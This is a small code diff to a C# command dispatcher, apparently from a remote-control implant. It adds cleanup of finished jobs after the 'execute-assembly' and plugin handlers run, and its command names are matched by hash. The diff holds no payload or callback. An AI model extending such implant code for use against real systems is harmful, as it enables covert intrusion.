@@ -87,6 +87,7 @@ namespace Athena.Commands
                     break;
                 case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
                     this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
                     RequestExit(job);
@@ -196,6 +197,7 @@ namespace Athena.Commands
                     break;
                 default:
                     this.responseResults.Add(await CheckAndRunPlugin(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
             }
 #if WINBUILD
